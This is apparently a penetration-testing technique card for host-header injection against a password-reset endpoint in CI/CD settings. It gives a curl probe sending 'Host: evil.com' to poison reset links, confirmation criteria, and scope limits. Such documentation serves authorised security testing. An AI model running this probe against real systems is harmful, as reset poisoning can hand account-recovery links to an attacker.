# 1.9 Host-header injection (score 65) [ONE request, off-peak] — ci-cd / unauth

- source canon: `3am-shinjitsu/arsenal-01-network-edge.md`
- base technique: `3am-shinjitsu-arsenal-01-network-edge-1-9-host-header-inject.md`
- bindings: **WSTG-INPV** · **CWE-74** · **ATT&CK T1190**
- context: **ci-cd** · auth **unauth** · chain role **pivot**

## Context

- platform: pipeline config/runner surface — secrets and lateral movement ride the runners
- auth state: no credential material — the classic differential applies as-is; absent auth = the authn-bypass class

## The technique

- DECISIVE: `curl -s -H 'Host: evil.com' https://<target>/password-reset -d 'email=x@y.z'`
  → inspect reset link host in any response body / downstream email (operator-supplied box).
- CONFIRMED WHEN: reset URL carries attacker host (reset poisoning / cache poisoning).
- FP: absolute-URL builders that re-derive host server-side.

## Probe adjustment (ci-cd × unauth)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
